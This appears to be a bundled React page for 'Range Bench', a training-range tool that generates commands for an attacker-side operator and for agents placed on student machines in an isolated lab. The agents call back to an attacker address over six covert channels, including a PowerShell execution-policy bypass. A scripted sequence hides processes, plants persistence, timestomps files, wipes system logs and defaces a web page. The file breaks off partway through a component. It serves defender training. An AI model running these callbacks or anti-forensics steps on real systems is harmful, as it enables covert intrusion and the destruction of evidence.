import { i as __toESM } from "../_runtime.mjs";
import { K as require_react, b as require_jsx_runtime } from "../_libs/@tanstack/react-router+[...].mjs";
import { a as Copy, i as Download, n as Radio, o as Check, r as Lock } from "../_libs/lucide-react.mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/routes-Ckeoi1TQ.js
var import_react = /* @__PURE__ */ __toESM(require_react());
var import_jsx_runtime = require_jsx_runtime();
var PRESET_PRIVILEGED = {
	tcp: 443,
	http: 80,
	dns: 53,
	mqtt: 1883,
	ws: 8070
};
var PRESET_OPEN = {
	tcp: 8443,
	http: 8088,
	dns: 5353,
	mqtt: 1883,
	ws: 8070
};
var CHANNELS = [
	{
		id: "tcp",
		label: "TCP",
		powershell: true,
		filter: "tcp.port == 443 && !tls",
		tell: "Port 443 with no TLS Client Hello. One base64 line each way. Follow the stream, then decode.",
		shape: "d3s1...  (base64 of a short JSON frame, not a shell prompt)"
	},
	{
		id: "http",
		label: "HTTP",
		powershell: true,
		filter: "http.request.uri contains \"/debian/dists\" or http.request.uri contains \"/ocsp/\"",
		tell: "Linux traffic looks like apt fetching InRelease. A real MD5 is 32 hex characters; a task is much longer. Windows looks like an OCSP status whose Nonce grew. Cookie sid= is the agent name.",
		shape: "MD5Sum:\n <long hex> 812 main/binary-amd64/Packages"
	},
	{
		id: "dns",
		label: "DNS",
		powershell: false,
		filter: "dns.qry.name contains \".lab\" && dns.qry.type == 16",
		tell: "TXT queries straight at the attacker, not the lab resolver. Idle answers are 32 hex characters. A task is a longer hex TXT. Labels on the way back carry hex too.",
		shape: "p.web01.41.lab    TXT    <hex>"
	},
	{
		id: "mqtt",
		label: "MQTT",
		powershell: false,
		filter: "mqtt",
		tell: "A broker on the attacker. Topics lab/<id>/in and lab/<id>/out. The payload is base64, the topic is the only obvious structure.",
		shape: "PUBLISH lab/web01/in\n<base64>"
	},
	{
		id: "ws",
		label: "WebSocket",
		powershell: true,
		filter: "websocket",
		tell: "One HTTP upgrade to /notifications, then quiet text frames. Students who only look at HTTP objects see a single request.",
		shape: "GET /notifications HTTP/1.1\nUpgrade: websocket"
	},
	{
		id: "icmp",
		label: "ICMP",
		powershell: false,
		filter: "icmp && data.len > 32",
		tell: "Echo requests whose data field is base64, on a timer, with a stable ICMP id. Linux only, and the attacker stops answering ordinary pings while the operator is running.",
		shape: "type 8  id=0x1a2b  data=<base64>"
	}
];
function sanitizeId(value) {
	return (value.toLowerCase().replace(/[^a-z0-9-]/g, "").replace(/^-+|-+$/g, "") || "host").slice(0, 24);
}
function sanitizeZone(value) {
	return sanitizeId(value || "lab");
}
function shQuote(value) {
	return `'${value.replace(/'/g, `'\\''`)}'`;
}
function psQuote(value) {
	return `'${value.replace(/'/g, "''")}'`;
}
function tokenOrPlaceholder(token) {
	return token.trim().length >= 8 ? token.trim() : "your-lab-token";
}
function portFlags(cfg) {
	return [
		`--tcp-port ${cfg.tcp}`,
		`--http-port ${cfg.http}`,
		`--dns-port ${cfg.dns}`,
		`--mqtt-port ${cfg.mqtt}`,
		`--ws-port ${cfg.ws}`,
		`--zone ${sanitizeZone(cfg.zone)}`
	].join(" ");
}
function operatorCommand(cfg, files) {
	const token = shQuote(tokenOrPlaceholder(cfg.token));
	const webroot = cfg.webroot.trim() ? ` --webroot ${shQuote(cfg.webroot.trim())}` : "";
	const attacker = cfg.attacker.trim() ? ` --attacker ${shQuote(cfg.attacker.trim())}` : "";
	const page = files?.page ? ` --page ${shQuote(files.page)}` : "";
	const image = files?.image ? ` --image ${shQuote(files.image)}` : "";
	return `sudo python3 range.py operator --token ${token} --bind 0.0.0.0 ${portFlags(cfg)}${webroot}${attacker}${page}${image}`;
}
function linuxAgentCommand(cfg) {
	const token = shQuote(tokenOrPlaceholder(cfg.token));
	return [
		"sudo python3 range.py agent",
		`--c2 ${cfg.attacker.trim() || "10.0.0.10"}`,
		`--channel ${cfg.channel}`,
		`--token ${token}`,
		`--id ${sanitizeId(cfg.linuxId)}`,
		`--profile ${cfg.timing}`,
		portFlags(cfg)
	].join(" ");
}
function windowsCommand(cfg) {
	const token = psQuote(tokenOrPlaceholder(cfg.token));
	if (!CHANNELS.find((item) => item.id === cfg.channel)?.powershell) {
		const quoted = shQuote(tokenOrPlaceholder(cfg.token));
		return [
			"python range.py agent",
			`--c2 ${cfg.attacker.trim() || "10.0.0.10"}`,
			`--channel ${cfg.channel}`,
			`--token ${quoted}`,
			`--id ${sanitizeId(cfg.windowsId)}`,
			`--profile ${cfg.timing}`,
			portFlags(cfg)
		].join(" ");
	}
	return [
		"powershell -NoProfile -ExecutionPolicy Bypass -File .\\range-agent.ps1",
		`-C2 ${cfg.attacker.trim() || "10.0.0.10"}`,
		`-Channel ${cfg.channel}`,
		`-Token ${token}`,
		`-Id ${sanitizeId(cfg.windowsId)}`,
		`-Timing ${cfg.timing}`,
		`-TcpPort ${cfg.tcp}`,
		`-HttpPort ${cfg.http}`,
		`-WsPort ${cfg.ws}`
	].join(" ");
}
function needsPythonOnWindows(channel) {
	return !CHANNELS.find((item) => item.id === channel)?.powershell;
}
var DEFAULT_HOSTS = [
	{
		id: "wan",
		name: "wan",
		role: "router",
		os: "VYOS",
		address: "10.50.160.129",
		port: 20222,
		sshUser: "atropia_admin",
		focus: false,
		note: "Last two octets change. Router port stays 20222. This hop is the path, not a fanout target."
	},
	{
		id: "lan",
		name: "lan",
		role: "router",
		os: "VYOS",
		address: "172.24.18.1",
		port: 20222,
		sshUser: "atropia_admin",
		focus: true,
		note: ""
	},
	{
		id: "lan2",
		name: "lan2",
		role: "router",
		os: "VYOS",
		address: "172.24.2.4",
		port: 20222,
		sshUser: "atropia_admin",
		focus: true,
		note: ""
	},
	{
		id: "win-82",
		name: "win-82",
		role: "host",
		os: "Windows 10",
		address: "172.24.18.82",
		port: 22,
		sshUser: "defender",
		focus: true,
		note: ""
	},
	{
		id: "deb-68",
		name: "deb-68",
		role: "host",
		os: "Debian 12",
		address: "172.24.18.68",
		port: 22,
		sshUser: "root",
		focus: true,
		note: ""
	},
	{
		id: "deb-150",
		name: "deb-150",
		role: "host",
		os: "Debian 12",
		address: "172.24.10.150",
		port: 22,
		sshUser: "root",
		focus: true,
		note: ""
	},
	{
		id: "web-nginx",
		name: "web-nginx",
		role: "host",
		os: "Debian 12",
		address: "172.24.10.180",
		port: 22,
		sshUser: "root",
		focus: true,
		note: "NGINX defacement"
	},
	{
		id: "deb9-44",
		name: "deb9-44",
		role: "host",
		os: "Debian 9",
		address: "172.24.19.44",
		port: 22,
		sshUser: "root",
		focus: true,
		note: "Debian 9"
	},
	{
		id: "deb-22",
		name: "deb-22",
		role: "host",
		os: "Debian 12",
		address: "172.24.22.19",
		port: 22,
		sshUser: "root",
		focus: true,
		note: ""
	}
];
var DEFAULT_CONFIG = {
	attacker: "10.0.0.10",
	token: "",
	linuxId: "web-nginx",
	windowsId: "win-82",
	channel: "ws",
	timing: "continuous",
	zone: "lab",
	webroot: "",
	jump1User: "cvte",
	jump1Host: "10.50.11.232",
	jump2User: "cvte",
	jump2Host: "172.24.24.101",
	wanUser: "atropia_admin",
	student: "defender",
	actor: "mail",
	shell: "vi",
	wall: "The page changed. The process list is the wrong tool.",
	hosts: DEFAULT_HOSTS,
	...PRESET_PRIVILEGED
};
function sanitizeHostName(value) {
	return (value.toLowerCase().replace(/[^a-z0-9-]/g, "").replace(/^-+|-+$/g, "") || "host").slice(0, 24);
}
function hostsDocument(cfg) {
	const wan = cfg.hosts.find((host) => host.id === "wan");
	return {
		jumps: [{
			name: "jump-a",
			user: cfg.jump1User.trim() || "cvte",
			host: cfg.jump1Host.trim(),
			port: 22
		}, {
			name: "jump-b",
			user: cfg.jump2User.trim() || "cvte",
			host: cfg.jump2Host.trim(),
			port: 22
		}],
		hosts: cfg.hosts.map((host) => ({
			id: host.id,
			name: host.name,
			role: host.role,
			os: host.os,
			host: host.address.trim(),
			port: host.port,
			user: host.id === "wan" ? cfg.wanUser.trim() || host.sshUser : host.sshUser,
			focus: host.focus,
			note: host.note
		})),
		wanUser: cfg.wanUser.trim() || wan?.sshUser || "atropia_admin"
	};
}
function sshConfig(cfg) {
	const doc = hostsDocument(cfg);
	const lines = [
		"# Range lab path. Use with ssh -F. This file replaces proxychains.",
		"# The first connection types the jump passwords and then keeps a master socket.",
		"# ICMP does not fit in a SOCKS proxy. Ping from lab-wan, which is already on the lab.",
		"Host *",
		"  ControlMaster auto",
		"  ControlPath ~/.ssh/range-cm-%C",
		"  ControlPersist yes",
		"  ServerAliveInterval 30",
		"  ServerAliveCountMax 0",
		"  StrictHostKeyChecking accept-new",
		""
	];
	let previous = "";
	doc.jumps.forEach((jump) => {
		lines.push(`Host ${jump.name}`);
		lines.push(`  HostName ${jump.host}`);
		lines.push(`  User ${jump.user}`);
		lines.push(`  Port ${jump.port}`);
		if (previous) lines.push(`  ProxyJump ${previous}`);
		lines.push("");
		previous = jump.name;
	});
	const wan = doc.hosts.find((host) => host.name === "wan" || host.id === "wan");
	const others = doc.hosts.filter((host) => host !== wan);
	if (wan) {
		lines.push("Host lab-wan");
		lines.push(`  HostName ${wan.host}`);
		lines.push(`  User ${wan.user || "atropia_admin"}`);
		lines.push(`  Port ${wan.port || 20222}`);
		if (previous) lines.push(`  ProxyJump ${previous}`);
		lines.push("");
	}
	others.forEach((host) => {
		const alias = `lab-${sanitizeHostName(host.name || host.host)}`;
		lines.push(`Host ${alias}`);
		lines.push(`  HostName ${host.host}`);
		lines.push(`  User ${host.user || "root"}`);
		lines.push(`  Port ${host.port || 22}`);
		lines.push(wan ? "  ProxyJump lab-wan" : previous ? `  ProxyJump ${previous}` : "");
		lines.push("");
	});
	return lines.filter((line) => line !== void 0).join("\n").replace(/\n{3,}/g, "\n\n").trim() + "\n";
}
function keysCommand() {
	return "python3 range.py keys --hosts range-hosts.json --ssh-config range-ssh.conf";
}
function openTunnelCommand() {
	return "ssh -F range-ssh.conf lab-wan";
}
function pingCommand(address) {
	return `python3 range.py ping --ssh-config range-ssh.conf ${address.trim() || "172.24.10.180"}`;
}
function fanoutCommand() {
	return "python3 range.py fanout --hosts range-hosts.json --ssh-config range-ssh.conf --cmd 'hostname; who'";
}
function watchCommand(student) {
	return `python3 range.py watch --hosts range-hosts.json --ssh-config range-ssh.conf --student ${sanitizeId(student || "defender")}`;
}
function tradecraftScript(cfg) {
	const student = sanitizeId(cfg.student || "defender");
	const actor = sanitizeId(cfg.actor || "mail");
	const shell = cfg.shell || "vi";
	const wall = (cfg.wall || "The page changed.").replace(/\n/g, " ");
	return [
		`use ${sanitizeId(cfg.linuxId || "web-nginx")}`,
		`play history ${student}`,
		`play account ${actor}`,
		`play shell ${student} ${shell}`,
		`play wall ${wall}`,
		"play cloak",
		`play veil ${actor}`,
		"play persist",
		"play stamp",
		`play boot ${student}`,
		"play logs",
		"tty",
		"get /etc/hostname ./hostname.txt",
		"put ./hostname.txt /tmp/hostname.txt",
		"play deface"
	].join("\n");
}
function crc32(data) {
	let crc = 4294967295;
	for (let i = 0; i < data.length; i += 1) {
		crc ^= data[i];
		for (let bit = 0; bit < 8; bit += 1) crc = crc & 1 ? crc >>> 1 ^ 3988292384 : crc >>> 1;
	}
	return (crc ^ 4294967295) >>> 0;
}
function normalizeConfig(saved) {
	const shell = saved?.shell === "python" || saved?.shell === "perl" || saved?.shell === "vi" ? saved.shell : "vi";
	const hosts = (Array.isArray(saved?.hosts) && saved.hosts.length > 0 ? saved.hosts : DEFAULT_HOSTS).map((host) => {
		if (host.id === "deb9-150" || host.address === "172.24.10.150" && /debian 9/i.test(host.os)) return {
			...host,
			id: "deb9-44",
			name: host.name === "deb9-150" ? "deb9-44" : host.name,
			address: "172.24.19.44",
			os: "Debian 9",
			note: host.note.includes("Same address") ? "Debian 9" : host.note
		};
		return host;
	});
	const timing = saved?.timing === "off" ? "off" : "continuous";
	return {
		...DEFAULT_CONFIG,
		...saved,
		shell,
		hosts,
		timing
	};
}
function zipStore(files) {
	const chunks = [];
	const central = [];
	let offset = 0;
	const encoder = new TextEncoder();
	files.forEach((file) => {
		const name = encoder.encode(file.name);
		const crc = crc32(file.data);
		const local = new Uint8Array(30 + name.length);
		const view = new DataView(local.buffer);
		view.setUint32(0, 67324752, true);
		view.setUint16(4, 20, true);
		view.setUint16(8, 0, true);
		view.setUint16(26, name.length, true);
		view.setUint32(14, crc, true);
		view.setUint32(18, file.data.length, true);
		view.setUint32(22, file.data.length, true);
		local.set(name, 30);
		chunks.push(local, file.data);
		const cent = new Uint8Array(46 + name.length);
		const cv = new DataView(cent.buffer);
		cv.setUint32(0, 33639248, true);
		cv.setUint16(4, 20, true);
		cv.setUint16(6, 20, true);
		cv.setUint16(28, name.length, true);
		cv.setUint32(16, crc, true);
		cv.setUint32(20, file.data.length, true);
		cv.setUint32(24, file.data.length, true);
		cv.setUint32(42, offset, true);
		cent.set(name, 46);
		central.push(cent);
		offset += local.length + file.data.length;
	});
	const centralSize = central.reduce((sum, part) => sum + part.length, 0);
	const end = /* @__PURE__ */ new Uint8Array(22);
	const ev = new DataView(end.buffer);
	ev.setUint32(0, 101010256, true);
	ev.setUint16(8, files.length, true);
	ev.setUint16(10, files.length, true);
	ev.setUint32(12, centralSize, true);
	ev.setUint32(16, offset, true);
	return new Blob([
		...chunks,
		...central,
		end
	], { type: "application/zip" });
}
function CopyBlock({ title, hint, command }) {
	const [copied, setCopied] = (0, import_react.useState)(false);
	async function copy() {
		try {
			await navigator.clipboard.writeText(command);
			setCopied(true);
			window.setTimeout(() => setCopied(false), 1600);
		} catch {
			setCopied(false);
		}
	}
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("section", {
		className: "rounded-xl border border-border bg-surface p-4",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
			className: "flex items-start justify-between gap-3",
			children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
				className: "text-base font-semibold",
				children: title
			}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "mt-1 text-sm leading-relaxed text-muted",
				children: hint
			})] }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
				type: "button",
				onClick: copy,
				className: "inline-flex min-h-11 shrink-0 items-center gap-2 rounded-lg border border-border px-3 text-sm text-fg",
				children: [copied ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Check, {
					className: "size-4 text-primary",
					"aria-hidden": "true"
				}) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Copy, {
					className: "size-4",
					"aria-hidden": "true"
				}), copied ? "Copied" : "Copy"]
			})]
		}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("pre", {
			className: "mt-3 overflow-x-auto whitespace-pre-wrap rounded-lg bg-surface-2 p-3 font-mono text-sm leading-relaxed text-fg",
			children: command
		})]
	});
}
function LabFloor({ cfg, onChange, htmlName, htmlText, imageName, imageBytes }) {
	const nginx = cfg.hosts.find((host) => host.id === "web-nginx");
	const dupes = /* @__PURE__ */ new Set();
	const seen = /* @__PURE__ */ new Set();
	cfg.hosts.forEach((host) => {
		const key = host.address.trim();
		if (!key) return;
		if (seen.has(key)) dupes.add(key);
		seen.add(key);
	});
	function patchHost(id, partial) {
		onChange({ hosts: cfg.hosts.map((host) => host.id === id ? {
			...host,
			...partial
		} : host) });
	}
	async function downloadPath() {
		const encoder = new TextEncoder();
		const files = [{
			name: "range-hosts.json",
			data: encoder.encode(JSON.stringify(hostsDocument(cfg), null, 2) + "\n")
		}, {
			name: "range-ssh.conf",
			data: encoder.encode(sshConfig(cfg))
		}];
		if (htmlText && htmlName) files.push({
			name: `deface/${htmlName}`,
			data: encoder.encode(htmlText)
		});
		if (imageBytes && imageName) files.push({
			name: `deface/${imageName}`,
			data: new Uint8Array(imageBytes)
		});
		const blob = zipStore(files);
		const url = URL.createObjectURL(blob);
		const link = document.createElement("a");
		link.href = url;
		link.download = "range-path.zip";
		link.click();
		URL.revokeObjectURL(url);
	}
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("section", {
		className: "flex flex-col gap-4",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "flex flex-col gap-2 sm:flex-row sm:items-end sm:justify-between",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
					className: "text-lg font-semibold",
					children: "Path into the lab"
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
					className: "mt-1 max-w-3xl text-sm leading-relaxed text-muted",
					children: "Students should treat 10.50.0.0/24 as the public side. There is no real internet. The WAN router’s last two octets change; the router port stays 20222. Hosts on 172.24.0.0/24 stay on port 22."
				})] }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
					type: "button",
					onClick: downloadPath,
					className: "inline-flex min-h-11 items-center justify-center gap-2 rounded-xl border border-border px-4 text-sm font-semibold text-fg",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Download, {
						className: "size-4",
						"aria-hidden": "true"
					}), "Download path files"]
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "grid gap-3 sm:grid-cols-2 lg:grid-cols-4",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
						label: "Jump 1 user",
						value: cfg.jump1User,
						onChange: (jump1User) => onChange({ jump1User })
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
						label: "Jump 1 host",
						value: cfg.jump1Host,
						onChange: (jump1Host) => onChange({ jump1Host })
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
						label: "Jump 2 user",
						value: cfg.jump2User,
						onChange: (jump2User) => onChange({ jump2User })
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
						label: "Jump 2 host",
						value: cfg.jump2Host,
						onChange: (jump2Host) => onChange({ jump2Host })
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
						label: "WAN user",
						value: cfg.wanUser,
						onChange: (wanUser) => onChange({ wanUser })
					})
				]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
				className: "text-sm leading-relaxed text-muted",
				children: [
					"This is a ProxyJump with a shared SSH socket, not a SOCKS proxy. Proxychains was loading a library into every process and it cannot carry ICMP. Open the master once, type the jump passwords, and later commands reuse that socket. X11 is left off. Add ",
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
						className: "font-mono text-fg",
						children: "-X"
					}),
					" yourself on a single ssh if you need a window."
				]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "grid gap-4 lg:grid-cols-2",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CopyBlock, {
						title: "Open the master",
						hint: "Type the jump passwords once. The socket stays up until you close it or the class is rebuilt. It does not expire.",
						command: openTunnelCommand()
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CopyBlock, {
						title: "Install your key",
						hint: "Copies the public key on this account to every jump, both routers, and every host. Each one asks once. After that, this class does not ask again. A rebuilt VM needs it once more.",
						command: keysCommand()
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CopyBlock, {
						title: "ICMP",
						hint: "Runs ping on the WAN router, which can actually reach the lab. A laptop ping still will not cross the jump.",
						command: pingCommand(nginx?.address || "172.24.10.180")
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CopyBlock, {
						title: "One command, every host",
						hint: "Routers included. The WAN hop is the path, not a target.",
						command: fanoutCommand()
					})
				]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CopyBlock, {
				title: "Watch the class",
				hint: "Opens an SSH socket to every focused host and both LAN routers, then keeps them. Every few seconds it prints who is logged in and the last lines of the student history. Same output is marked unchanged. Ctrl-C stops the printing. The sockets stay. Agents are separate: sessions in the operator only lists hosts where a callback is running.",
				command: watchCommand(cfg.student)
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "flex flex-col gap-3",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
						className: "text-lg font-semibold",
						children: "Roster"
					}),
					dupes.size > 0 ? /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
						className: "text-sm text-primary",
						children: [
							"Two rows share ",
							Array.from(dupes).join(", "),
							". Watch uses the first. Fanout still opens both until you change one."
						]
					}) : null,
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
						className: "flex flex-col gap-3",
						children: cfg.hosts.map((host) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "grid gap-2 rounded-xl border border-border bg-surface p-3 sm:grid-cols-6 sm:items-end",
							children: [
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
									id: `${host.id}-name`,
									label: "Name",
									value: host.name,
									onChange: (name) => patchHost(host.id, { name })
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
									id: `${host.id}-os`,
									label: "OS",
									value: host.os,
									onChange: (os) => patchHost(host.id, { os })
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
									id: `${host.id}-address`,
									label: "Address",
									value: host.address,
									onChange: (address) => patchHost(host.id, { address })
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
									className: "flex flex-col gap-2 text-sm text-muted",
									children: ["Port", /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
										inputMode: "numeric",
										value: String(host.port),
										onChange: (event) => {
											const next = Number(event.target.value.replace(/[^0-9]/g, ""));
											if (Number.isFinite(next)) patchHost(host.id, { port: Math.min(next, 65535) });
										},
										className: "min-h-11 rounded-lg border border-border bg-surface-2 px-3 font-mono text-sm text-fg"
									})]
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
									id: `${host.id}-ssh`,
									label: "SSH user",
									value: host.sshUser,
									onChange: (sshUser) => patchHost(host.id, { sshUser })
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
									className: "flex min-h-11 items-center gap-2 text-sm text-fg",
									children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
										type: "checkbox",
										checked: host.focus,
										onChange: (event) => patchHost(host.id, { focus: event.target.checked }),
										className: "size-4"
									}), "Fanout"]
								}),
								host.note ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
									className: "text-sm text-muted sm:col-span-6",
									children: host.note
								}) : null
							]
						}, host.id))
					})
				]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "flex flex-col gap-3",
				children: [
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
						className: "text-lg font-semibold",
						children: "On the host, after the agent is up"
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", {
						className: "max-w-3xl text-sm leading-relaxed text-muted",
						children: [
							"These run through the callback, as root on Linux. The student stays ",
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "font-mono text-fg",
								children: cfg.student || "defender"
							}),
							". You move to a service account once they find the first one. The Linux account password is printed on your console and is not inside the tasking. The shadow file gets the hash. Windows ",
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "font-mono text-fg",
								children: "net user"
							}),
							" cannot take a hash, so that password does travel in the clear. Prefer the Linux account when the class is decoding live."
						]
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "grid gap-3 sm:grid-cols-2 lg:grid-cols-4",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
								label: "Student",
								value: cfg.student,
								onChange: (student) => onChange({ student })
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
								label: "Service account",
								value: cfg.actor,
								onChange: (actor) => onChange({ actor })
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
								className: "flex flex-col gap-2 text-sm text-muted",
								children: ["Login shell", /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("select", {
									value: cfg.shell,
									onChange: (event) => onChange({ shell: event.target.value }),
									className: "min-h-11 rounded-lg border border-border bg-surface-2 px-3 text-fg",
									children: [
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("option", {
											value: "vi",
											children: "vi"
										}),
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("option", {
											value: "python",
											children: "python"
										}),
										/* @__PURE__ */ (0, import_jsx_runtime.jsx)("option", {
											value: "perl",
											children: "perl"
										})
									]
								})]
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Mini, {
								label: "wall -n",
								value: cfg.wall,
								onChange: (wall) => onChange({ wall })
							})
						]
					}),
					/* @__PURE__ */ (0, import_jsx_runtime.jsx)(CopyBlock, {
						title: "What you type",
						hint: "One agent selected. history shows what they are hunting. shell is usermod -s. cloak copies bash over false and nologin. veil wraps ps, ss, netstat, w, and who. htop, top, and last stay unwrapped. stamp is touch -r against /bin/ls. boot logs the student off. play logs zeroes auth, syslog, nginx, wtmp, and the journal, and leaves bash history. tty is a real terminal, so nano works there. Ctrl-] leaves it. get and put move one file if you would rather edit it on this machine.",
						command: tradecraftScript(cfg)
					})
				]
			})
		]
	});
}
function Mini({ label, value, onChange, id }) {
	const fieldId = id || label.toLowerCase().replace(/[^a-z0-9]+/g, "-");
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
		className: "flex flex-col gap-2 text-sm text-muted",
		htmlFor: fieldId,
		children: [label, /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
			id: fieldId,
			value,
			spellCheck: false,
			suppressHydrationWarning: true,
			onChange: (event) => onChange(event.target.value),
			className: "min-h-11 rounded-lg border border-border bg-surface-2 px-3 font-mono text-sm text-fg"
		})]
	});
}
var STORAGE_KEY = "range-bench";
function Home() {
	const [cfg, setCfg] = (0, import_react.useState)(DEFAULT_CONFIG);
	const [preset, setPreset] = (0, import_react.useState)("class");
	const [htmlName, setHtmlName] = (0, import_react.useState)("");
	const [htmlText, setHtmlText] = (0, import_react.useState)("");
	const [imageName, setImageName] = (0, import_react.useState)("");
	const [imageBytes, setImageBytes] = (0, import_react.useState)(null);
	const [uploadNote, setUploadNote] = (0, import_react.useState)("");
	(0, import_react.useEffect)(() => {
		try {
			const raw = localStorage.getItem(STORAGE_KEY);
			if (!raw) return;
			const saved = JSON.parse(raw);
			setCfg(normalizeConfig(saved));
			if (saved.preset === "open" || saved.preset === "class") setPreset(saved.preset);
		} catch {}
	}, []);
	(0, import_react.useEffect)(() => {
		localStorage.setItem(STORAGE_KEY, JSON.stringify({
			...cfg,
			preset
		}));
	}, [cfg, preset]);
	const channel = CHANNELS.find((item) => item.id === cfg.channel) ?? CHANNELS[0];
	const tokenShort = cfg.token.trim().length > 0 && cfg.token.trim().length < 8;
	function patch(partial) {
		setCfg((current) => ({
			...current,
			...partial
		}));
	}
	function applyPreset(next) {
		setPreset(next);
		patch(next === "class" ? PRESET_PRIVILEGED : PRESET_OPEN);
	}
	function newToken() {
		const alphabet = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789";
		const bytes = /* @__PURE__ */ new Uint8Array(24);
		crypto.getRandomValues(bytes);
		patch({ token: Array.from(bytes, (byte) => alphabet[byte % 57]).join("") });
	}
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("main", {
		className: "mx-auto flex w-full max-w-6xl flex-col gap-8 px-4 py-8 sm:px-6 sm:py-10",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("header", {
				className: "flex flex-col gap-6 border-b border-border pb-6 sm:flex-row sm:items-end sm:justify-between",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "flex flex-col gap-2",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "font-mono text-xs tracking-widest text-primary uppercase",
							children: "Isolated lab only"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", {
							className: "text-3xl font-semibold tracking-tight sm:text-4xl",
							children: "Range Bench"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "max-w-2xl text-base leading-relaxed text-muted",
							children: "One operator on the attacker VM, one agent on each student guest. Six readable callback channels, the same live shell, and a deface that also locks the page."
						})
					]
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("a", {
					href: "/range-lab.zip",
					download: true,
					className: "inline-flex min-h-11 items-center justify-center gap-2 rounded-xl bg-primary px-4 py-3 text-sm font-semibold text-primary-fg",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Download, {
						className: "size-4",
						"aria-hidden": "true"
					}), "Download kit"]
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("section", {
				className: "grid gap-4 lg:grid-cols-5",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "flex flex-col gap-4 rounded-xl border border-border bg-surface p-4 lg:col-span-2 sm:p-5",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h2", {
							className: "text-lg font-semibold",
							children: "Lab settings"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Field, {
							label: "Attacker address",
							value: cfg.attacker,
							onChange: (attacker) => patch({ attacker })
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
							className: "flex flex-col gap-2",
							children: [
								/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
									className: "flex items-end justify-between gap-3",
